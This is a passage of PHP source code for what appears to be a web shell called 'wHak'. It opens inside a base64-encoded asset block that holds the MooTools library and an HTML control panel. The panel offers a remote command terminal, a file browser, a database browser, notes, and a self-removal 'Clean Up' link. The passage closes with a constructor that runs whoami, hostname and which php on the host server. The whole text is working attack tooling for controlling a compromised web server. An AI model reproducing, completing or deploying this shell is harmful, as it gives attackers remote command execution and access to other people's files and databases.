hpcy5lbGVtZW50LGMsYltjXSk7CmVbY109YS5mcm9tO2RbY109YS50bzt9cmV0dXJuIHRoaXMucGFyZW50KGUsZCk7fX0pO0VsZW1lbnQuUHJvcGVydGllcy5tb3JwaD17c2V0OmZ1bmN0aW9uKGEpe3ZhciBiPXRoaXMucmV0cmlldmUoIm1vcnBoIik7aWYoYil7Yi5jYW5jZWwoKTt9cmV0dXJuIHRoaXMuZWxpbWluYXRlKCJtb3JwaCIpLnN0b3JlKCJtb3JwaDpvcHRpb25zIiwkZXh0ZW5kKHtsaW5rOiJjYW5jZWwifSxhKSk7Cn0sZ2V0OmZ1bmN0aW9uKGEpe2lmKGF8fCF0aGlzLnJldHJpZXZlKCJtb3JwaCIpKXtpZihhfHwhdGhpcy5yZXRyaWV2ZSgibW9ycGg6b3B0aW9ucyIpKXt0aGlzLnNldCgibW9ycGgiLGEpO310aGlzLnN0b3JlKCJtb3JwaCIsbmV3IEZ4Lk1vcnBoKHRoaXMsdGhpcy5yZXRyaWV2ZSgibW9ycGg6b3B0aW9ucyIpKSk7Cn1yZXR1cm4gdGhpcy5yZXRyaWV2ZSgibW9ycGgiKTt9fTtFbGVtZW50LmltcGxlbWVudCh7bW9ycGg6ZnVuY3Rpb24oYSl7dGhpcy5nZXQoIm1vcnBoIikuc3RhcnQoYSk7cmV0dXJuIHRoaXM7fX0pO0Z4LmltcGxlbWVudCh7Z2V0VHJhbnNpdGlvbjpmdW5jdGlvbigpe3ZhciBhPXRoaXMub3B0aW9ucy50cmFuc2l0aW9ufHxGeC5UcmFuc2l0aW9ucy5TaW5lLmVhc2VJbk91dDsKaWYodHlwZW9mIGE9PSJzdHJpbmciKXt2YXIgYj1hLnNwbGl0KCI6Iik7YT1GeC5UcmFuc2l0aW9uczthPWFbYlswXV18fGFbYlswXS5jYXBpdGFsaXplKCldO2lmKGJbMV0pe2E9YVsiZWFzZSIrYlsxXS5jYXBpdGFsaXplKCkrKGJbMl0/YlsyXS5jYXBpdGFsaXplKCk6IiIpXTsKfX1yZXR1cm4gYTt9fSk7RnguVHJhbnNpdGlvbj1mdW5jdGlvbihiLGEpe2E9JHNwbGF0KGEpO3JldHVybiAkZXh0ZW5kKGIse2Vhc2VJbjpmdW5jdGlvbihjKXtyZXR1cm4gYihjLGEpO30sZWFzZU91dDpmdW5jdGlvbihjKXtyZXR1cm4gMS1iKDEtYyxhKTt9LGVhc2VJbk91dDpmdW5jdGlvbihjKXtyZXR1cm4oYzw9MC41KT9iKDIqYyxhKS8yOigyLWIoMiooMS1jKSxhKSkvMjsKfX0pO307RnguVHJhbnNpdGlvbnM9bmV3IEhhc2goe2xpbmVhcjokYXJndW1lbnRzKDApfSk7RnguVHJhbnNpdGlvbnMuZXh0ZW5kPWZ1bmN0aW9uKGEpe2Zvcih2YXIgYiBpbiBhKXtGeC5UcmFuc2l0aW9uc1tiXT1uZXcgRnguVHJhbnNpdGlvbihhW2JdKTt9fTtGeC5UcmFuc2l0aW9ucy5leHRlbmQoe1BvdzpmdW5jdGlvbihiLGEpe3JldHVybiBNYXRoLnBvdyhiLGFbMF18fDYpOwp9LEV4cG86ZnVuY3Rpb24oYSl7cmV0dXJuIE1hdGgucG93KDIsOCooYS0xKSk7fSxDaXJjOmZ1bmN0aW9uKGEpe3JldHVybiAxLU1hdGguc2luKE1hdGguYWNvcyhhKSk7fSxTaW5lOmZ1bmN0aW9uKGEpe3JldHVybiAxLU1hdGguc2luKCgxLWEpKk1hdGguUEkvMik7Cn0sQmFjazpmdW5jdGlvbihiLGEpe2E9YVswXXx8MS42MTg7cmV0dXJuIE1hdGgucG93KGIsMikqKChhKzEpKmItYSk7fSxCb3VuY2U6ZnVuY3Rpb24oZil7dmFyIGU7Zm9yKHZhciBkPTAsYz0xOzE7ZCs9YyxjLz0yKXtpZihmPj0oNy00KmQpLzExKXtlPWMqYy1NYXRoLnBvdygoMTEtNipkLTExKmYpLzQsMik7CmJyZWFrO319cmV0dXJuIGU7fSxFbGFzdGljOmZ1bmN0aW9uKGIsYSl7cmV0dXJuIE1hdGgucG93KDIsMTAqLS1iKSpNYXRoLmNvcygyMCpiKk1hdGguUEkqKGFbMF18fDEpLzMpO319KTtbIlF1YWQiLCJDdWJpYyIsIlF1YXJ0IiwiUXVpbnQiXS5lYWNoKGZ1bmN0aW9uKGIsYSl7RnguVHJhbnNpdGlvbnNbYl09bmV3IEZ4LlRyYW5zaXRpb24oZnVuY3Rpb24oYyl7cmV0dXJuIE1hdGgucG93KGMsW2ErMl0pOwp9KTt9KTt2YXIgUmVxdWVzdD1uZXcgQ2xhc3Moe0ltcGxlbWVudHM6W0NoYWluLEV2ZW50cyxPcHRpb25zXSxvcHRpb25zOnt1cmw6IiIsZGF0YToiIixoZWFkZXJzOnsiWC1SZXF1ZXN0ZWQtV2l0aCI6IlhNTEh0dHBSZXF1ZXN0IixBY2NlcHQ6InRleHQvamF2YXNjcmlwdCwgdGV4dC9odG1sLCBhcHBsaWNhdGlvbi94bWwsIHRleHQveG1sLCAqLyoifSxhc3luYzp0cnVlLGZvcm1hdDpmYWxzZSxtZXRob2Q6InBvc3QiLGxpbms6Imlnbm9yZSIsaXNTdWNjZXNzOm51bGwsZW11bGF0aW9uOnRydWUsdXJsRW5jb2RlZDp0cnVlLGVuY29kaW5nOiJ1dGYtOCIsZXZhbFNjcmlwdHM6ZmFsc2UsZXZhbFJlc3BvbnNlOmZhbHNlLG5vQ2FjaGU6ZmFsc2V9LGluaXRpYWxpemU6ZnVuY3Rpb24oYSl7dGhpcy54aHI9bmV3IEJyb3dzZXIuUmVxdWVzdCgpOwp0aGlzLnNldE9wdGlvbnMoYSk7dGhpcy5vcHRpb25zLmlzU3VjY2Vzcz10aGlzLm9wdGlvbnMuaXNTdWNjZXNzfHx0aGlzLmlzU3VjY2Vzczt0aGlzLmhlYWRlcnM9bmV3IEhhc2godGhpcy5vcHRpb25zLmhlYWRlcnMpO30sb25TdGF0ZUNoYW5nZTpmdW5jdGlvbigpe2lmKHRoaXMueGhyLnJlYWR5U3RhdGUhPTR8fCF0aGlzLnJ1bm5pbmcpe3JldHVybjsKfXRoaXMucnVubmluZz1mYWxzZTt0aGlzLnN0YXR1cz0wOyR0cnkoZnVuY3Rpb24oKXt0aGlzLnN0YXR1cz10aGlzLnhoci5zdGF0dXM7fS5iaW5kKHRoaXMpKTtpZih0aGlzLm9wdGlvbnMuaXNTdWNjZXNzLmNhbGwodGhpcyx0aGlzLnN0YXR1cykpe3RoaXMucmVzcG9uc2U9e3RleHQ6dGhpcy54aHIucmVzcG9uc2VUZXh0LHhtbDp0aGlzLnhoci5yZXNwb25zZVhNTH07CnRoaXMuc3VjY2Vzcyh0aGlzLnJlc3BvbnNlLnRleHQsdGhpcy5yZXNwb25zZS54bWwpO31lbHNle3RoaXMucmVzcG9uc2U9e3RleHQ6bnVsbCx4bWw6bnVsbH07dGhpcy5mYWlsdXJlKCk7fXRoaXMueGhyLm9ucmVhZHlzdGF0ZWNoYW5nZT0kZW1wdHk7fSxpc1N1Y2Nlc3M6ZnVuY3Rpb24oKXtyZXR1cm4oKHRoaXMuc3RhdHVzPj0yMDApJiYodGhpcy5zdGF0dXM8MzAwKSk7Cn0scHJvY2Vzc1NjcmlwdHM6ZnVuY3Rpb24oYSl7aWYodGhpcy5vcHRpb25zLmV2YWxSZXNwb25zZXx8KC8oZWNtYXxqYXZhKXNjcmlwdC8pLnRlc3QodGhpcy5nZXRIZWFkZXIoIkNvbnRlbnQtdHlwZSIpKSl7cmV0dXJuICRleGVjKGEpO31yZXR1cm4gYS5zdHJpcFNjcmlwdHModGhpcy5vcHRpb25zLmV2YWxTY3JpcHRzKTsKfSxzdWNjZXNzOmZ1bmN0aW9uKGIsYSl7dGhpcy5vblN1Y2Nlc3ModGhpcy5wcm9jZXNzU2NyaXB0cyhiKSxhKTt9LG9uU3VjY2VzczpmdW5jdGlvbigpe3RoaXMuZmlyZUV2ZW50KCJjb21wbGV0ZSIsYXJndW1lbnRzKS5maXJlRXZlbnQoInN1Y2Nlc3MiLGFyZ3VtZW50cykuY2FsbENoYWluKCk7Cn0sZmFpbHVyZTpmdW5jdGlvbigpe3RoaXMub25GYWlsdXJlKCk7fSxvbkZhaWx1cmU6ZnVuY3Rpb24oKXt0aGlzLmZpcmVFdmVudCgiY29tcGxldGUiKS5maXJlRXZlbnQoImZhaWx1cmUiLHRoaXMueGhyKTt9LHNldEhlYWRlcjpmdW5jdGlvbihhLGIpe3RoaXMuaGVhZGVycy5zZXQoYSxiKTsKcmV0dXJuIHRoaXM7fSxnZXRIZWFkZXI6ZnVuY3Rpb24oYSl7cmV0dXJuICR0cnkoZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy54aHIuZ2V0UmVzcG9uc2VIZWFkZXIoYSk7fS5iaW5kKHRoaXMpKTt9LGNoZWNrOmZ1bmN0aW9uKCl7aWYoIXRoaXMucnVubmluZyl7cmV0dXJuIHRydWU7Cn1zd2l0Y2godGhpcy5vcHRpb25zLmxpbmspe2Nhc2UiY2FuY2VsIjp0aGlzLmNhbmNlbCgpO3JldHVybiB0cnVlO2Nhc2UiY2hhaW4iOnRoaXMuY2hhaW4odGhpcy5jYWxsZXIuYmluZCh0aGlzLGFyZ3VtZW50cykpO3JldHVybiBmYWxzZTt9cmV0dXJuIGZhbHNlO30sc2VuZDpmdW5jdGlvbihqKXtpZighdGhpcy5jaGVjayhqKSl7cmV0dXJuIHRoaXM7Cn10aGlzLnJ1bm5pbmc9dHJ1ZTt2YXIgaD0kdHlwZShqKTtpZihoPT0ic3RyaW5nInx8aD09ImVsZW1lbnQiKXtqPXtkYXRhOmp9O312YXIgZD10aGlzLm9wdGlvbnM7aj0kZXh0ZW5kKHtkYXRhOmQuZGF0YSx1cmw6ZC51cmwsbWV0aG9kOmQubWV0aG9kfSxqKTt2YXIgZj1qLmRhdGEsYj1qLnVybCxhPWoubWV0aG9kOwpzd2l0Y2goJHR5cGUoZikpe2Nhc2UiZWxlbWVudCI6Zj0kKGYpLnRvUXVlcnlTdHJpbmcoKTticmVhaztjYXNlIm9iamVjdCI6Y2FzZSJoYXNoIjpmPUhhc2gudG9RdWVyeVN0cmluZyhmKTt9aWYodGhpcy5vcHRpb25zLmZvcm1hdCl7dmFyIGk9ImZvcm1hdD0iK3RoaXMub3B0aW9ucy5mb3JtYXQ7CmY9KGYpP2krIiYiK2Y6aTt9aWYodGhpcy5vcHRpb25zLmVtdWxhdGlvbiYmWyJwdXQiLCJkZWxldGUiXS5jb250YWlucyhhKSl7dmFyIGc9Il9tZXRob2Q9IithO2Y9KGYpP2crIiYiK2Y6ZzthPSJwb3N0Ijt9aWYodGhpcy5vcHRpb25zLnVybEVuY29kZWQmJmE9PSJwb3N0Iil7dmFyIGM9KHRoaXMub3B0aW9ucy5lbmNvZGluZyk/IjsgY2hhcnNldD0iK3RoaXMub3B0aW9ucy5lbmNvZGluZzoiIjsKdGhpcy5oZWFkZXJzLnNldCgiQ29udGVudC10eXBlIiwiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIitjKTt9aWYodGhpcy5vcHRpb25zLm5vQ2FjaGUpe3ZhciBlPSJub0NhY2hlPSIrbmV3IERhdGUoKS5nZXRUaW1lKCk7Zj0oZik/ZSsiJiIrZjplOwp9aWYoZiYmYT09ImdldCIpe2I9YisoYi5jb250YWlucygiPyIpPyImIjoiPyIpK2Y7Zj1udWxsO310aGlzLnhoci5vcGVuKGEudG9VcHBlckNhc2UoKSxiLHRoaXMub3B0aW9ucy5hc3luYyk7dGhpcy54aHIub25yZWFkeXN0YXRlY2hhbmdlPXRoaXMub25TdGF0ZUNoYW5nZS5iaW5kKHRoaXMpOwp0aGlzLmhlYWRlcnMuZWFjaChmdW5jdGlvbihsLGspe3RyeXt0aGlzLnhoci5zZXRSZXF1ZXN0SGVhZGVyKGssbCk7fWNhdGNoKG0pe3RoaXMuZmlyZUV2ZW50KCJleGNlcHRpb24iLFtrLGxdKTt9fSx0aGlzKTt0aGlzLmZpcmVFdmVudCgicmVxdWVzdCIpO3RoaXMueGhyLnNlbmQoZik7CmlmKCF0aGlzLm9wdGlvbnMuYXN5bmMpe3RoaXMub25TdGF0ZUNoYW5nZSgpO31yZXR1cm4gdGhpczt9LGNhbmNlbDpmdW5jdGlvbigpe2lmKCF0aGlzLnJ1bm5pbmcpe3JldHVybiB0aGlzO310aGlzLnJ1bm5pbmc9ZmFsc2U7dGhpcy54aHIuYWJvcnQoKTt0aGlzLnhoci5vbnJlYWR5c3RhdGVjaGFuZ2U9JGVtcHR5Owp0aGlzLnhocj1uZXcgQnJvd3Nlci5SZXF1ZXN0KCk7dGhpcy5maXJlRXZlbnQoImNhbmNlbCIpO3JldHVybiB0aGlzO319KTsoZnVuY3Rpb24oKXt2YXIgYT17fTtbImdldCIsInBvc3QiLCJwdXQiLCJkZWxldGUiLCJHRVQiLCJQT1NUIiwiUFVUIiwiREVMRVRFIl0uZWFjaChmdW5jdGlvbihiKXthW2JdPWZ1bmN0aW9uKCl7dmFyIGM9QXJyYXkubGluayhhcmd1bWVudHMse3VybDpTdHJpbmcudHlwZSxkYXRhOiRkZWZpbmVkfSk7CnJldHVybiB0aGlzLnNlbmQoJGV4dGVuZChjLHttZXRob2Q6Yi50b0xvd2VyQ2FzZSgpfSkpO307fSk7UmVxdWVzdC5pbXBsZW1lbnQoYSk7fSkoKTtSZXF1ZXN0LkhUTUw9bmV3IENsYXNzKHtFeHRlbmRzOlJlcXVlc3Qsb3B0aW9uczp7dXBkYXRlOmZhbHNlLGFwcGVuZDpmYWxzZSxldmFsU2NyaXB0czp0cnVlLGZpbHRlcjpmYWxzZX0scHJvY2Vzc0hUTUw6ZnVuY3Rpb24oYyl7dmFyIGI9Yy5tYXRjaCgvPGJvZHlbXj5dKj4oW1xzXFNdKj8pPFwvYm9keT4vaSk7CmM9KGIpP2JbMV06Yzt2YXIgYT1uZXcgRWxlbWVudCgiZGl2Iik7cmV0dXJuICR0cnkoZnVuY3Rpb24oKXt2YXIgZD0iPHJvb3Q+IitjKyI8L3Jvb3Q+IixnO2lmKEJyb3dzZXIuRW5naW5lLnRyaWRlbnQpe2c9bmV3IEFjdGl2ZVhPYmplY3QoIk1pY3Jvc29mdC5YTUxET00iKTsKZy5hc3luYz1mYWxzZTtnLmxvYWRYTUwoZCk7fWVsc2V7Zz1uZXcgRE9NUGFyc2VyKCkucGFyc2VGcm9tU3RyaW5nKGQsInRleHQveG1sIik7fWQ9Zy5nZXRFbGVtZW50c0J5VGFnTmFtZSgicm9vdCIpWzBdO2lmKCFkKXtyZXR1cm4gbnVsbDt9Zm9yKHZhciBmPTAsZT1kLmNoaWxkTm9kZXMubGVuZ3RoOwpmPGU7ZisrKXt2YXIgaD1FbGVtZW50LmNsb25lKGQuY2hpbGROb2Rlc1tmXSx0cnVlLHRydWUpO2lmKGgpe2EuZ3JhYihoKTt9fXJldHVybiBhO30pfHxhLnNldCgiaHRtbCIsYyk7fSxzdWNjZXNzOmZ1bmN0aW9uKGQpe3ZhciBjPXRoaXMub3B0aW9ucyxiPXRoaXMucmVzcG9uc2U7CmIuaHRtbD1kLnN0cmlwU2NyaXB0cyhmdW5jdGlvbihlKXtiLmphdmFzY3JpcHQ9ZTt9KTt2YXIgYT10aGlzLnByb2Nlc3NIVE1MKGIuaHRtbCk7Yi50cmVlPWEuY2hpbGROb2RlcztiLmVsZW1lbnRzPWEuZ2V0RWxlbWVudHMoIioiKTtpZihjLmZpbHRlcil7Yi50cmVlPWIuZWxlbWVudHMuZmlsdGVyKGMuZmlsdGVyKTsKfWlmKGMudXBkYXRlKXskKGMudXBkYXRlKS5lbXB0eSgpLnNldCgiaHRtbCIsYi5odG1sKTt9ZWxzZXtpZihjLmFwcGVuZCl7JChjLmFwcGVuZCkuYWRvcHQoYS5nZXRDaGlsZHJlbigpKTt9fWlmKGMuZXZhbFNjcmlwdHMpeyRleGVjKGIuamF2YXNjcmlwdCk7fXRoaXMub25TdWNjZXNzKGIudHJlZSxiLmVsZW1lbnRzLGIuaHRtbCxiLmphdmFzY3JpcHQpOwp9fSk7RWxlbWVudC5Qcm9wZXJ0aWVzLnNlbmQ9e3NldDpmdW5jdGlvbihhKXt2YXIgYj10aGlzLnJldHJpZXZlKCJzZW5kIik7aWYoYil7Yi5jYW5jZWwoKTt9cmV0dXJuIHRoaXMuZWxpbWluYXRlKCJzZW5kIikuc3RvcmUoInNlbmQ6b3B0aW9ucyIsJGV4dGVuZCh7ZGF0YTp0aGlzLGxpbms6ImNhbmNlbCIsbWV0aG9kOnRoaXMuZ2V0KCJtZXRob2QiKXx8InBvc3QiLHVybDp0aGlzLmdldCgiYWN0aW9uIil9LGEpKTsKfSxnZXQ6ZnVuY3Rpb24oYSl7aWYoYXx8IXRoaXMucmV0cmlldmUoInNlbmQiKSl7aWYoYXx8IXRoaXMucmV0cmlldmUoInNlbmQ6b3B0aW9ucyIpKXt0aGlzLnNldCgic2VuZCIsYSk7fXRoaXMuc3RvcmUoInNlbmQiLG5ldyBSZXF1ZXN0KHRoaXMucmV0cmlldmUoInNlbmQ6b3B0aW9ucyIpKSk7Cn1yZXR1cm4gdGhpcy5yZXRyaWV2ZSgic2VuZCIpO319O0VsZW1lbnQuUHJvcGVydGllcy5sb2FkPXtzZXQ6ZnVuY3Rpb24oYSl7dmFyIGI9dGhpcy5yZXRyaWV2ZSgibG9hZCIpO2lmKGIpe2IuY2FuY2VsKCk7fXJldHVybiB0aGlzLmVsaW1pbmF0ZSgibG9hZCIpLnN0b3JlKCJsb2FkOm9wdGlvbnMiLCRleHRlbmQoe2RhdGE6dGhpcyxsaW5rOiJjYW5jZWwiLHVwZGF0ZTp0aGlzLG1ldGhvZDoiZ2V0In0sYSkpOwp9LGdldDpmdW5jdGlvbihhKXtpZihhfHwhdGhpcy5yZXRyaWV2ZSgibG9hZCIpKXtpZihhfHwhdGhpcy5yZXRyaWV2ZSgibG9hZDpvcHRpb25zIikpe3RoaXMuc2V0KCJsb2FkIixhKTt9dGhpcy5zdG9yZSgibG9hZCIsbmV3IFJlcXVlc3QuSFRNTCh0aGlzLnJldHJpZXZlKCJsb2FkOm9wdGlvbnMiKSkpOwp9cmV0dXJuIHRoaXMucmV0cmlldmUoImxvYWQiKTt9fTtFbGVtZW50LmltcGxlbWVudCh7c2VuZDpmdW5jdGlvbihhKXt2YXIgYj10aGlzLmdldCgic2VuZCIpO2Iuc2VuZCh7ZGF0YTp0aGlzLHVybDphfHxiLm9wdGlvbnMudXJsfSk7cmV0dXJuIHRoaXM7fSxsb2FkOmZ1bmN0aW9uKCl7dGhpcy5nZXQoImxvYWQiKS5zZW5kKEFycmF5LmxpbmsoYXJndW1lbnRzLHtkYXRhOk9iamVjdC50eXBlLHVybDpTdHJpbmcudHlwZX0pKTsKcmV0dXJuIHRoaXM7fX0pO1JlcXVlc3QuSlNPTj1uZXcgQ2xhc3Moe0V4dGVuZHM6UmVxdWVzdCxvcHRpb25zOntzZWN1cmU6dHJ1ZX0saW5pdGlhbGl6ZTpmdW5jdGlvbihhKXt0aGlzLnBhcmVudChhKTt0aGlzLmhlYWRlcnMuZXh0ZW5kKHtBY2NlcHQ6ImFwcGxpY2F0aW9uL2pzb24iLCJYLVJlcXVlc3QiOiJKU09OIn0pOwp9LHN1Y2Nlc3M6ZnVuY3Rpb24oYSl7dGhpcy5yZXNwb25zZS5qc29uPUpTT04uZGVjb2RlKGEsdGhpcy5vcHRpb25zLnNlY3VyZSk7dGhpcy5vblN1Y2Nlc3ModGhpcy5yZXNwb25zZS5qc29uLGEpO319KTsKCgo=',
  'main.html' => 'cHJpbnQgJzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ij8+JzsKPz4KPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgU3RyaWN0Ly9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXN0cmljdC5kdGQiPgo8aHRtbCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCIgeG1sOmxhbmc9ImVuIiBsYW5nPSJlbiI+CjxoZWFkPgogICAgPHRpdGxlPndIYWsgPD9waHAgcHJpbnQgJHRoaXMtPlNlc3Npb25bJ3dob2FtaSddLidAJy4gJF9TRVJWRVJbJ0hUVFBfSE9TVCddIC4nOicuJHRoaXMtPlNlc3Npb25bJ2N3ZCddIC4nJCc7ID8+PC90aXRsZT4KICAgIDxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Ij9tPWNvbnRlbnQmbz1tb290b29scy5qcyI+PC9zY3JpcHQ+CiAgICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSI/bT1jb250ZW50Jm89ZnVuY3Rpb25zLmpzIj48L3NjcmlwdD4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgbWVkaWE9InNjcmVlbiIgaHJlZj0iP209Y29udGVudCZvPW1haW4uY3NzIiAvPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBtZWRpYT0ic2NyZWVuIiBocmVmPSI/bT1jb250ZW50Jm89aWNvbi5zaWxrLnNwcml0ZXNoZWV0LmNzcyIgLz4KPC9oZWFkPgo8Ym9keSBjbGFzcz0iaGJveCI+CiAgICA8ZGl2IGlkPSJoZWFkZXIiPgogICAgICAgIDxkaXYgY2xhc3M9ImhlYWRlci1pbmZvIj4KICAgICAgICAgICAgPHNwYW4gaWQ9InNlcnZlci10aW1lIj48L3NwYW4+PGJyIC8+CiAgICAgICAgICAgIDxzcGFuIGlkPSJzZXJ2ZXItcGhwX3ZlcnNpb24iPjwvc3Bhbj4KICAgICAgICA8L2Rpdj4KICAgICAgICA8aDE+d0hhayA8P3BocCBwcmludCBXSF9WRVJTSU9OOyA/PjwvaDE+CiAgICAgICAgPHVsIGNsYXNzPSJuYXYiPgogICAgICAgICAgICA8bGk+PGEgY2xhc3M9Imljb24gdGVybWluYWwiIGhyZWY9ImphdmFzY3JpcHQ6c2hvdygnY29uc29sZS1zZWN0aW9uJykiIHRpdGxlPSJUZXJtaW5hbCI+VGVybWluYWw8L2E+PC9saT4KICAgICAgICAgICAgPGxpPjxhIGNsYXNzPSJpY29uIG5vdGUiIGhyZWY9ImphdmFzY3JpcHQ6c2hvdygnbm90ZS1zZWN0aW9uJykiIHRpdGxlPSJOb3RlcyI+Tm90ZXM8L2E+PC9saT4KICAgICAgICAgICAgPGxpPjxhIGNsYXNzPSJpY29uIGZpbGVfZm9sZGVyIiBocmVmPSJqYXZhc2NyaXB0OnNob3coJ2ZpbGUtc2VjdGlvbicpIiB0aXRsZT0iRmlsZSBCcm93c2VyIj5GaWxlIEJyb3dzZXI8L2E+PC9saT4KICAgICAgICAgICAgPGxpPjxhIGNsYXNzPSJpY29uIGRhdGFiYXNlIiBocmVmPSJqYXZhc2NyaXB0OnNob3coJ2RiLXNlY3Rpb24nKSIgdGl0bGU9IkRCIEJyb3dzZXIiPkRCIEJyb3dzZXI8L2E+PC9saT4KICAgICAgICAgICAgPGxpPjxhIGNsYXNzPSJpY29uIGNsZWFudXAiIGhyZWY9Ij9tPWNsZWFuX3VwIiB0aXRsZT0iUmVtb3ZlIFdoYWsiPkNsZWFuIFVwPC9hPjwvbGk+CiAgICAgICAgICAgIDxsaT48YSBjbGFzcz0iaWNvbiBmaWxlX3ppcF88Pz0oV0hfU1RBVFVTPT09J0NPTVBJTEVEJykgPyAnZ28nIDogJ2FkZCc/PiIgaHJlZj0iP209PD89KFdIX1NUQVRVUz09PSdDT01QSUxFRCcpID8gJ2V4dHJhY3QnIDogJ2NvbXBpbGUnPz4iIHRpdGxlPSJDb21waWxlL0V4dHJheHQgd2hhayI+PD89KFdIX1NUQVRVUz09PSdDT01QSUxFRCcpID8gJ0V4dHJhY3QnIDogJ0NvbXBpbGUnPz48L2E+PC9saT4KICAgICAgICAgICAgPGxpPjxhIGNsYXNzPSJpY29uIGFycm93X2Rvd24iIGhyZWY9Ij9tPWRsIiB0aXRsZT0iRG93bmxvYWQgd2hhayI+RG93bmxvYWQ8L2E+PC9saT4KICAgICAgICAgICAgPGxpPjxhIGNsYXNzPSJpY29uIGxvZ291dCIgaHJlZj0iP209bG9nb3V0IiB0aXRsZT0iTG9nb3V0Ij5Mb2cgT3V0PC9hPjwvbGk+CiAgICAgICAgPC91bD4KICAgIDwvZGl2PgogICAgPGRpdiBpZD0iY29udGVudCI+CiAgICAgICAgPGRpdiBjbGFzcz0ic2VjdGlvbiIgaWQ9ImNvbnNvbGUtc2VjdGlvbiI+CiAgICAgICAgICAgIDxmb3JtIGlkPSJjbWQtZm9ybSIgYWN0aW9uPSI/bT1jbWQiIG1ldGhvZD0icG9zdCI+CiAgICAgICAgICAgICAgICA8ZGl2IGlkPSJjb25zb2xlLWNvbnRlbnQiPjwvZGl2PgogICAgICAgICAgICAgICAgPGRpdiBpZD0iY29uc29sZS1jbWQiPgogICAgICAgICAgICAgICAgICAgIDxzcGFuIGlkPSJzZXJ2ZXItcHJvbXB0Ij48L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImNtZCIgaWQ9ImNtZCIgYXV0b2NvbXBsZXRlPSJvZmYiIC8+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9mb3JtPgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9InNlY3Rpb24iIGlkPSJub3RlLXNlY3Rpb24iIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+CiAgICAgICAgICAgIDxhIGhyZWY9Ij9tPWRsX25vdGVzIiBjbGFzcz0iaWNvbiBhcnJvd19kb3duIiB0aXRsZT0iZG93bmxvYWQgbm90ZXMiPjwvYT4KICAgICAgICAgICAgPGRpdiBpZD0ic2VydmVyLW5vdGVzIj4KICAgICAgICAgICAgICAgIDw/cGhwIHByaW50ICR0aGlzLT5nZXRfbm90ZV9odG1sKCk7ID8+CiAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgPGZvcm0gaWQ9Im5vdGUtZm9ybSIgYWN0aW9uPSI/bT1hZGRfbm90ZSIgbWV0aG9kPSJwb3N0Ij4KICAgICAgICAgICAgICAgIDx0ZXh0YXJlYSBuYW1lPSJub3RlcyIgaWQ9Im5vdGVzIj48L3RleHRhcmVhPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlNhdmUiIC8+CiAgICAgICAgICAgIDwvZm9ybT4KICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJzZWN0aW9uIiBpZD0iZmlsZS1zZWN0aW9uIiBzdHlsZT0iZGlzcGxheTogbm9uZTsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgJHRoaXMtPmFjdGlvbl9scygpOwogICAgICAgICAgICA/PgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9InNlY3Rpb24iIGlkPSJkYi1zZWN0aW9uIiBzdHlsZT0iZGlzcGxheTogbm9uZTsiPgogICAgICAgICA8ZGl2IGlkPSJ3cmFwcGVyIj4KICAgICAgICAgICAgPHRhYmxlPgogICAgICAgICAgICAgICAgPHRyPgogICAgICAgICAgICAgICAgICAgIDx0ZCBzdHlsZT0id2lkdGg6MjAwcHg7Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBpZD0ibGVmdCI+CiAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmFjdGlvbl9teXNxbCgkX0dFVCk7CiAgICAgICAgICAgICAgICAgICAgICAgID8+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvdGQ+CiAgICAgICAgICAgICAgICAgICAgPHRkIHZhbGlnbj0ndG9wJyBhbGlnbj0nbGVmdCc+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgaWQ9InJpZ2h0Ij4mbmJzcDsKICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC90ZD4KICAgICAgICAgICAgICAgIDwvdHI+CiAgICAgICAgICAgIDwvdGFibGU+CiAgICAgICAgIDwvZGl2PiAgICAgICAKCiAgICAgICAgICAgIAogICAgICAgIDwvZGl2PgogICAgPC9kaXY+CgogICAgPGRpdiBpZD0iZm9vdGVyIj4KICAgICAgICA8ZGl2IGlkPSJzZXJ2ZXItbmFtZSI+PC9kaXY+CiAgICAgICAgPHNwYW4gaWQ9InNlcnZlci11cHRpbWUiPjwvc3Bhbj4KICAgIDwvZGl2PgogICAgPGlmcmFtZSBpZD0iaWZyYW1lLWhhY2siIG5hbWU9ImlmcmFtZS1oYWNrIj48L2lmcmFtZT4KPC9ib2R5Pgo8L2h0bWw+',
);
    ####----

    function whak(){

        session_start();

        if(isset($_SESSION[$this->_cfg['session_index']]) === false){
            $_SESSION[$this->_cfg['session_index']] = array(
                'logged_in' => false,
                'whoami'    => trim(`whoami`),
                'uname'     => php_uname(),
                'notes'     => array(),
                'cwd'       => dirname(__FILE__),
                'server_name' => isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : trim(`hostname`),
                'php_path'=>str_replace('php is ', '', trim(`which php`)),
                'last_note' => false
            );
        }
        $this->Session = &$_SESSION[$this->_cfg['session_index']];
        $this->mysql = new mysql($this->Session['notes']);

